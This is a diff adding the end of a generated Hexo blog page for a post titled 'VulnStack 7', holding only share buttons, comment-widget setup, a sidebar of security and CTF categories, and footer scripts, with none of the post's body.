+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/58260.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/58260.html";
+            const title         = "「VulnStack 7」";
+            const excerpt       = `不想复习啊，打个vulnstack7放松一下就当我今天学习了吧`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-12-05T17:53:02.577Z" itemprop="dateModified">最后编辑：2024-12-06</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" SPEL注入Spring内存马" href="/posts/6350.html">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/58260.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                84
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                14
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.71em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/58260.html"><i class="fa  fa-book"></i> VulnStack 7</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/6350.html"><i class="fa  fa-book"></i> SPEL注入Spring内存马</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/58068.html"><i class="fa  fa-book"></i> VulnStack 4</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/10200.html"><i class="fa  fa-book"></i> 2024鹏城杯线上赛Web方向题解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/49264.html"><i class="fa  fa-book"></i> dasctf十月web方向部分题解</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
